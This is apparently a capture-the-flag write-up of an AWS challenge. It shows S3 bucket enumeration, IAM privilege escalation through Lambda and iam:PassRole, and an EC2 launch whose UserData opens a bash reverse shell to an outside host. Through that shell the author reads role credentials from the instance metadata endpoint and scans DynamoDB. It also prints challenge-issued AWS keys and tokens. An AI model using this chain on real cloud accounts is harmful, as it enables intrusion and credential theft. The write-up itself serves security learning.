## CloudyNekos
We are given a cloudfront link https://d20whnyjsgpc34.cloudfront.net/. In the link is an html webpage (full of cat pictures) and inside the source code we see the following hint:
```
<!-- 
      ----- Completed -----
      * Configure CloudFront to use the bucket - palindromecloudynekos as the origin
      
      ----- TODO -----
      * Configure custom header referrer and enforce S3 bucket to only accept that particular header
      * Secure all object access
    -->
```

Some research online:
1. We can use cloudfront to cache results for access to S3 bucket -- so this is what is probably happening here (we probably need to find the name of the s3 bucket?)

The S3 bucket seems to be here:
```
https://palindromecloudynekos.s3.amazonaws.com/
<Error>
<Code>AccessDenied</Code>
<Message>Access Denied</Message>
<RequestId>APPKF6VG7YNW5RY4</RequestId>
<HostId>uFx2hYLzxDKelYop5X3BRMO8OYDh63niXuqVkCKfTfjTFbalzdcoE6QPuOPdYM0moXyFixp98Xk=</HostId>
</Error>
```

Visiting `https://palindromecloudynekos.s3.amazonaws.com/index.html` will give the same `index.html`. 

Since we can access it, the entire bucket is probably publicly accessible. Let's see what inside this bucket.


`aws s3 ls s3://palindromecloudnekos`
```
TISC2022 % aws s3 ls s3://palindromecloudynekos
                           PRE api/
                           PRE img/
2022-08-23 21:16:20         34 error.html
2022-08-23 21:16:20       2257 index.html
```

`aws s3 ls s3://palindromecloudnekos --recursive`
```
TISC2022 % aws s3 ls s3://palindromecloudynekos --recursive
2022-08-23 21:16:20        432 api/notes.txt
2022-08-23 21:16:20         34 error.html
2022-07-22 18:02:45     404845 img/photo1.jpg
2022-07-22 18:02:45     164700 img/photo2.jpg
2022-07-22 18:02:46     199175 img/photo3.jpg
2022-07-22 18:02:45     226781 img/photo4.jpg
2022-07-22 18:02:46     249156 img/photo5.jpg
2022-07-22 18:02:45     185166 img/photo6.jpg
2022-08-23 21:16:20       2257 index.html
```

`api/notes.txt` looks highly suspicious... We get another clue:
```
# Neko Access System Invocation Notes

Invoke with the passcode in the header "x-cat-header". The passcode is found on the cloudfront site, all lower caps and separated using underscore.

https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent

All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
```

![Challenge4_1](./Images/Challenge4_1.png)

```
{"Message": "Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIAQYDFBGMSV3WJSARP", "Secret_Key": "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"}
```

I tried to list all the resources I can find inside `aws ec2`. It seems like we cannot `describe-instances` (list ec2 instances), `describe-volumes` (list volumes), but we can `describe-subnets` (list subnets available).

The subnet below has the name `palindrome`, looks like a good lead.
```bash
TISC2022 % aws ec2 describe-subnets
{
    "Subnets": [
        {
            "AvailabilityZone": "ap-southeast-1a",
            "AvailabilityZoneId": "apse1-az2",
            "AvailableIpAddressCount": 16347,
            "CidrBlock": "10.0.0.0/18",
            "DefaultForAz": false,
            "MapPublicIpOnLaunch": true,
            "MapCustomerOwnedIpOnLaunch": false,
            "State": "available",
            "SubnetId": "subnet-0aa6ecdf900166741",
            "VpcId": "vpc-095cd9241e386169d",
            "OwnerId": "051751498533",
            "AssignIpv6AddressOnCreation": false,
            "Ipv6CidrBlockAssociationSet": [],
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
                }
            ],
            "SubnetArn": "arn:aws:ec2:ap-southeast-1:051751498533:subnet/subnet-0aa6ecdf900166741",
            "EnableDns64": false,
            "Ipv6Native": false,
            "PrivateDnsNameOptionsOnLaunch": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            }
        }
    ]
}
```

Let's try to spin up an EC2 instance.

```
"VpcId": "vpc-095cd9241e386169d"
"SubnetId": "subnet-0aa6ecdf900166741"
Amazon Linux AMI: ami-0b89f7b3f054b957e
```

```
TISC2022 % aws ec2 run-instances --instance-type t2.nano --image-id ami-0b89f7b3f054b957e --subnet-id subnet-0aa6ecdf900166741

An error occurred (VcpuLimitExceeded) when calling the RunInstances operation: You have requested more vCPU capacity than your current vCPU limit of 32 allows for the instance bucket that the specified instance type belongs to. Please visit http://aws.amazon.com/contact-us/ec2-request to request an adjustment to this limit.
```

Seems like the number of vCPUs is maxed (in fact these user credentials didn't have permission to spawn an ec2 instance).

Used [IAM-Flaws](https://github.com/nikhil1232/IAM-Flaws) to enumerate permissions.

```bash
>Enumeration<<



Get User:

user-622fe79b83c446ad921b8f51e92e50f6

List Users:

Failed


Enter the User from above to proceed with:

user-622fe79b83c446ad921b8f51e92e50f6


List Groups:

Failed



List User Policies:

Failed



List User Attached Policies:

user-622fe79b83c446ad921b8f51e92e50f6


Attached User Policies Permissions: user-622fe79b83c446ad921b8f51e92e50f6


Action:

iam:GetPolicy
iam:GetPolicyVersion
iam:ListAttachedRolePolicies
iam:ListRoles

Resource:

*


Attached User Policies Permissions: user-622fe79b83c446ad921b8f51e92e50f6


Action:

lambda:CreateFunction
lambda:InvokeFunction
lambda:GetFunction

Resource:

arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*


Attached User Policies Permissions: user-622fe79b83c446ad921b8f51e92e50f6


Action:

iam:ListAttachedUserPolicies

Resource:

arn:aws:iam::051751498533:user/${aws:username}


Attached User Policies Permissions: user-622fe79b83c446ad921b8f51e92e50f6


Action:

iam:PassRole

Resource:

arn:aws:iam::051751498533:role/lambda_agent_development_role


Attached User Policies Permissions: user-622fe79b83c446ad921b8f51e92e50f6


Action:

ec2:DescribeVpcs
ec2:DescribeRegions
ec2:DescribeSubnets
ec2:DescribeRouteTables
ec2:DescribeSecurityGroups
ec2:DescribeInstanceTypes
iam:ListInstanceProfiles

Resource:

*



Allowed Permissions

ec2:DescribeInstanceTypes
ec2:DescribeRegions
ec2:DescribeRouteTables
ec2:DescribeSecurityGroups
ec2:DescribeSubnets
ec2:DescribeVpcs
iam:GetPolicy
iam:GetPolicyVersion
iam:ListAttachedRolePolicies
iam:ListAttachedUserPolicies
iam:ListInstanceProfiles
iam:ListRoles
iam:PassRole
lambda:CreateFunction
lambda:GetFunction
lambda:InvokeFunction

Denied Permissions

None

 Enumeration Complete. Thanks !!!


==================================================================================
```

Seems like I can do a lot of things on this user account. The lambda `CreateFunction`, `GetFunction` and `InvokeFunction` permissions look pretty *powerful*. I can also `PassRole` which basically means I can create a lambda function and assign a role to it, and that lambda function will have all the permissions that the role has.

From the above, it seems like the way forward is to create a lambda function, and pass the `lambda_agent_development_role` to it. Let's check what the `lambda_agent_development_role` can do:


`aws iam list-roles`

```json
{
    "Roles": [
        ...
        {
            "Path": "/",
            "RoleName": "ec2_agent_role",
            "RoleId": "AROAQYDFBGMSYSEMEVAEH",
            "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
            "CreateDate": "2022-07-22T09:29:34Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ec2.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_agent_development_role",
            "RoleId": "AROAQYDFBGMS2NDQR5JSE",
            "Arn": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
            "CreateDate": "2022-07-22T09:29:34Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_agent_webservice_role",
            "RoleId": "AROAQYDFBGMSTH7VQVGQC",
            "Arn": "arn:aws:iam::051751498533:role/lambda_agent_webservice_role",
            "CreateDate": "2022-07-22T09:29:35Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "lambda_cleaner_service_role",
            "RoleId": "AROAQYDFBGMSUI3AJILSK",
            "Arn": "arn:aws:iam::051751498533:role/lambda_cleaner_service_role",
            "CreateDate": "2022-07-22T09:29:34Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        }
    ]
}
```

The user account that I have basically has the role `lambda_agent_development_role`.

```bash
aws iam list-attached-role-policies --role-name lambda_agent_development_role
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_lambda_agent_development_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role"
        }
    ]
}
```

```bash
enumerate-iam % aws iam list-attached-role-policies --role-name lambda_agent_development_role
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_lambda_agent_development_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role"
        }
    ]
}
enumerate-iam % aws iam get-policy --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role
{
    "Policy": {
        "PolicyName": "iam_policy_for_lambda_agent_development_role",
        "PolicyId": "ANPAQYDFBGMS2XASGX3JS",
        "Arn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "AWS IAM Policy for Lambda agent development service",
        "CreateDate": "2022-07-22T09:29:36+00:00",
        "UpdateDate": "2022-08-23T13:16:26+00:00",
        "Tags": []
    }
}
enumerate-iam % aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:RunInstances",
                        "ec2:CreateVolume",
                        "ec2:CreateTags"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "lambda:GetFunction"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service"
                },
                {
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "Sid": "VisualEditor2"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-08-23T13:16:26+00:00"
    }
}
```

From here, we can see that the permissions that the `lambda_agent_development_role` has. It can run `ec2` instances, can pass the `ec2_agent_role` to it, and can execute `GetFunction` on `cat-service`.

We first explore what is `cat-service`:

We create `code.py`:
```
import boto3
def lambda_handler(event, context):
  client = boto3.client('lambda')
  response = client.get_function(FunctionName="arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service")
  
  return response
```

`code function.zip code.py`

```
aws lambda create-function --function-name user-860d7932eb424a9995d5ce743f0540cf-yolO --runtime python3.9 --role \
arn:aws:iam::051751498533:role/lambda_agent_development_role --handler code.lambda_handler --zip-file \
fileb://function.zip
```

```
aws lambda invoke --function-name user-860d7932eb424a9995d5ce743f0540cf-yolO output.txt
```

`output.txt` will contain the following:

```
{"ResponseMetadata": {"RequestId": "0ec67078-5f6b-4f7a-8ca6-66321b1e3efc", "HTTPStatusCode": 200, "HTTPHeaders": {"date": "Wed, 31 Aug 2022 09:51:44 GMT", "content-type": "application/json", "content-length": "2870", "connection": "keep-alive", "x-amzn-requestid": "0ec67078-5f6b-4f7a-8ca6-66321b1e3efc"}, "RetryAttempts": 0}, "Configuration": {"FunctionName": "cat-service", "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service", "Runtime": "python3.9", "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role", "Handler": "main.lambda_handler", "CodeSize": 416, "Description": "", "Timeout": 3, "MemorySize": 128, "LastModified": "2022-08-23T13:16:19.469+0000", "CodeSha256": "52UWd1KHAZub5aJIS953mHrKVM0mFPiVBuGahWFGaz4=", "Version": "$LATEST", "TracingConfig": {"Mode": "PassThrough"}, "RevisionId": "90be1b48-3339-4a78-a083-b77e285b7b8a", "State": "Active", "LastUpdateStatus": "Successful", "PackageType": "Zip", "Architectures": ["x86_64"]}, "Code": {"RepositoryType": "S3", "Location": "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/cat-service-f02e065f-3e98-4c04-8d77-c627d6d8d5a2?versionId=XMHQ4OlZGN52Y_FiI23NgMfVyC2eL_sD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEND%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkgwRgIhALpUX8kSCliyYLkYioFNWMj7NJXamJ8dQltnMQi8g55HAiEAgh4nRtQe298Ut0nfcc5Xe%2Fi4YQr8rxgTtP7jIF48Nf4q4QQIWRAEGgwyOTUzMzg3MDM1ODMiDC0e95XbGsNruf6CqSq%2BBPtKteHy8s23EaDC4MH6A0w8lTZLKNW80yxaKiJ61ckXL1rWHH5sRpKO3xLjen0XoWf%2BrRcHA6p3hlAJM2N7pTO5Fhw202cATX3jGU76b7HdntljtfYWw4O1ArjOfj4hBlVRS0Qyc7a8bJVn%2BgCsbbRMzFL7wKw7vVlYL%2F6OtDsweKjuEIoOXDEpyS%2FqztwkUTKkV3eYYWG6CLnuXJMiYOv%2FzYq8l5lRr3Yh3E5xZmZvFiseM0WuYc1tSfz4AHD9QkjLX%2B%2FphWAY%2Bm5gjj2xDYvZk1YeN%2BXXFVUbJf2EzDo7NJQgJ2Qzf%2BKDMPaI7NkuCq13ICH%2BAXZGYre4xgFo%2FYalQASMvgL8BLzkwwBP57jkrBhtk4g6h%2BD3lgy9cO2qjKyHr%2BIMAvab6e6N7sctVoHFqAEy%2FEl%2FFdrNXUy%2B7csqVNDDZDhU3uHk0UxloHIOqwuQOokC2YtIFyL1k1BCyYwHzCHREFigTDGFnP9gOz7tBlkCd95cNux%2BCvISC8x0nsqdGwqCmNTDCZg6FAtM0bKmPGOGxevTCRj0Q15sP48jDY0gJxVprdyJhYMKyA2BddWZllAVoeJpgWllosg9d%2B%2BuGkcE5zRHUQ4PGshUpJkeA4k2lIynBhc3%2BR6bj8hDPVJhuAu%2FaY0Bj2gFenWLR%2Bv4ql8D%2FIvQdAfFZbF7GM8PfrqTCbr0ruIGV6dych%2BqUmZyndYRIDvpzZLVTncg3DR4giFPec%2F3%2FaO9aHJCS0zGOV0b50edh%2FfpWqkKmL4wz6m8mAY6qAE0XTbf%2BnzxcnhTjhuljOfmy4q8aj%2F4%2BN3h93SQzBu8QCDf3Skxfb%2BN%2BzNJvCOmh7%2BADNCp4YojtDT0Mq5dzZYRqwbxhSqpiKHuRMTBTw%2BFWK6Z7LZtKNBFYZaLNSvhoDwXtyfivLRIWk%2FwGdBLsKIubSaIIa2IyCtPan69aeaH86Z79Sfxdan3GLxw9gDnZOMhzKVFFWzlDeSC%2BBRpceOBgEQnlGq1g%2Bg%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220831T095144Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LPXATTPCHF%2F20220831%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=8e369bd1a01d39082d6e3f733939591a8d26c33383afb6db383a1d45685910e9"}
```

The link will let us download a `.zip` file that contains `main.py`.

```python
import boto3

def lambda_handler(event, context):
    
    # Work in Progress: Requires help from Agents! 
    
    # ec2 = boto3.resource('ec2')

    # instances = ec2.create_instances(
    #    ImageId="???",
    #    MinCount=1,
    #    MaxCount=1,
    #    InstanceType="t2.micro"
    #)
    
    return {
        'status': 200,
        'results': 'This is work in progress. Agents, palindrome needs your help to complete the workflow! :3'
    }
```

This is probably a hint to spawn an ec2 instance, and additionally we can pass the role of `ec2_agent_development_role` to it.

Let's see what permissions does `ec2_agent_developemnt_role` have:

```bash
TISC2022 % aws iam list-attached-role-policies --role-name ec2_agent_role
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_ec2_agent_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role"
        }
    ]
}
TISC2022 % aws iam get-policy --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role
{
    "Policy": {
        "PolicyName": "iam_policy_for_ec2_agent_role",
        "PolicyId": "ANPAQYDFBGMSUUGDZFFBM",
        "Arn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "AWS IAM Policy for EC2 agent node",
        "CreateDate": "2022-07-22T09:29:34+00:00",
        "UpdateDate": "2022-07-22T09:29:34+00:00",
        "Tags": []
    }
}
TISC2022 % aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "dynamodb:DescribeTable",
                        "dynamodb:ListTables",
                        "dynamodb:Scan",
                        "dynamodb:Query"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "VisualEditor0"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-07-22T09:29:34+00:00"
    }
```

Looks like the `ec2_agent_developemnt_role` can list out data inside `dynamodb` (which is basically AWS's version of mongodb). Probably the flag is inside there?

Let's now use our lambda function to create an ec2 instance, and pass it the `ec2_agent_instance_profile`. 

```bash
Challenge 4B % aws iam list-instance-profiles
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2_agent_instance_profile",
            "InstanceProfileId": "AIPAQYDFBGMS6EKSSQ2RF",
            "Arn": "arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile",
            "CreateDate": "2022-07-22T09:29:35+00:00",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2_agent_role",
                    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
                    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "CreateDate": "2022-07-22T09:29:34+00:00",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
```

We have to attach this instance profile to the instance so that we can have the `ec2-agent-role` for the instance. Also, we need to be able to control the EC2 instance once we spawn it. An easy way will be to spawn a reverse shell once the instance is deployed. For this, we need a public IP (I spawned my own ec2 instance on my own personal AWS account) and then enter a a pretty basic reverse shell bash script into the `user_data` field of the ec2 instance.

```python
import boto3
import time

def lambda_handler(event, context):
    
    # Work in Progress: Requires help from Agents! 
    
    ec2 = boto3.resource('ec2')

    instances = ec2.create_instances(
       ImageId="ami-0b89f7b3f054b957e", # Amazon Linux
       MinCount=1,
       MaxCount=1,
       InstanceType="t2.micro",
       SubnetId="subnet-0aa6ecdf900166741",
       TagSpecifications=[
            {
                'ResourceType': 'instance',
                'Tags': [
                    {
                        'Key': 'agent',
                        'Value': 'user-860d7932eb424a9995d5ce743f0540cf' # change for the user, actually dont even know if this is needed but just put
                    },
                ]
            },
        ],
        UserData="""
        #!/bin/sh
        bash -i >& /dev/tcp/<your_reverse_shell_ip>/443 0>&1
        """,
        IamInstanceProfile={
            'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'
        }
    )

    instance = instances[0]
    return {
        'status': 200,
        'results': 'This is work in progress. Agents, palindrome needs your help to complete the workflow! :3',
        'public_dns': instance.public_dns_name,
        'public_ip': instance.public_ip_address,
        'security_groups': instance.security_groups,
        'subnet_id': instance.subnet_id,
        'tags': instance.tags,
        'iam_instance_profile': instance.iam_instance_profile
    }
```


`code function.zip code.py`

```
aws lambda create-function --function-name user-860d7932eb424a9995d5ce743f0540cf-yoloswag1234 --runtime python3.9 --role \
arn:aws:iam::051751498533:role/lambda_agent_development_role --handler main.lambda_handler --zip-file \
fileb://function.zip
```

```
aws lambda invoke --function-name user-860d7932eb424a9995d5ce743f0540cf-yoloswag1234 output.txt
```

I got a reverse shell on my own personal ec2 instance. Now we need to make use of the `ec2_agent_role` to access `dynamodb`. There is a special IP address that allows users in ec2 instance to retrieve metadata from AWS. See this [link](https://stackoverflow.com/questions/41024362/aws-retrieving-security-credentials-from-instance-metadata).

Inside the reverse shell:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_agent_role/
{
  "Code" : "Success",
  "LastUpdated" : "2022-09-01T06:15:05Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAQYDFBGMS3QFYIX3R",
  "SecretAccessKey" : "Sbtugassro5sJlN3RLxB6zy4xsGTCyXaBQU+h3l9",
  "Token" : "IQoJb3JpZ2luX2VjEOb//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgE5mVbnKtHCDsjmR6Q2B2XDFADVrsnNoj6NWcmd6ZkPcCIBd6xESxahCmSzjwTXjD/972YwZnYZLmS088IjApeZe4KuEECG8QARoMMDUxNzUxNDk4NTMzIgyYLXZ9nbmH4DzSVHsqvgSX1jgGg9EQGo+bUFiJLN/fYn/qmc6tbtw+LS0vrRNJvjtna2qJE7sCGOsYTUvrVzqWpRzYlRHOrVYpjBK/3oSZq6anjREEiLdjUEaFBL4Wd5HcAJ0BY5+wMIJ1qqMq/Ka1HYZtBoexlFrgt1b6qBWudfaahje5fkQDjqIC0T8ZYcN/gWqm0f+G6D5NrjI3BjdUk5jqqG7bI1P0dEClOiej9SUbYkmXG7Po/Hbte4BFjQnEOdyidaBunZ4CoXJeBtNKTiJ+txI/GGal0v7L+P7rqbvjdP9gLwPYJQiyEDa1Erj3kjSkkLTIyNUcCBoXzcEwJ3j4Idrnb1heEUlewhBUWSFq5blDtBNcJs+tT21gA+kuK+rMn5z2I4t5fezgW5Uue4w/+1c5mxpguVxyYgnEwHupxsOec/Ay70iXo5RjbFhAcjiXKin9jIyoCc8eXBUFxPvtlCgmu5eZ/+USk2tlquf3OTr8ULOlJogZVOC06X9e9inQ3uT+CLCeI6DifnLRq3jghpMd6KfhMTQDDIW++kgf/zorW3zD49gwPda3Pns4EDz85BS4xIIJMUkxYCB7mm+XKKeQoM5EuM5OdLx6xj2vsz3Aotms6Ax+f/I1zBWYCO3Bg3Xyhr2OX4pPt82ZwDH0BrdjLFOqB+JKKXvQ3MUDQ1w3Fng9zYU9H5aGc4N2FK5ui955GTdNt3FHcGMG8Xc4h+I/QJmTlBlKlplBarptT4ysMqVB0VENgXNRrdRwjQzRG1AHeE0rmQiZMO+bwZgGOqoBkvU8i68DFsT/3dYrLHLCCyxxdfSQANLU6fy5WvRUKAt57zxw8FSEIbaHiWlSxA0fAWdVfp3nkQMCHxWWT5MSyvbbFSVUIFByg1SxXz+u7yLI9dhmqaR4et5eV/6FysuRFuFlk755KJz61CX4aCTTIV6tPPswPR70qHRUNCwfvjSPogQY+O/E7XXe29Cb3aNxSCys3B1EEoi3HUzcaRGQ7mDAbGn/f7KghqA=",
  "Expiration" : "2022-09-01T12:50:11Z"
```

These are temporary AWS credentials, which means we have to use all 3, `AccessKeyId`, `SecretAccessKey` and `Token`.
```bash
export AWS_ACCESS_KEY_ID=<insert>
export AWS_SECRET_ACCESS_KEY=<insert>
export AWS_SESSION_TOKEN=<insert>
```

```bash
aws dynamodb scan --table-name flag_db\
{
    "Count": 1, 
    "Items": [
        {
            "secret": {
                "S": "TISC{iT3_N0t_s0_C1oUdy}"
            }, 
            "name": {
                "S": "flag"
            }
        }
    ], 
    "ScannedCount": 1, 
    "ConsumedCapacity": null
}
```

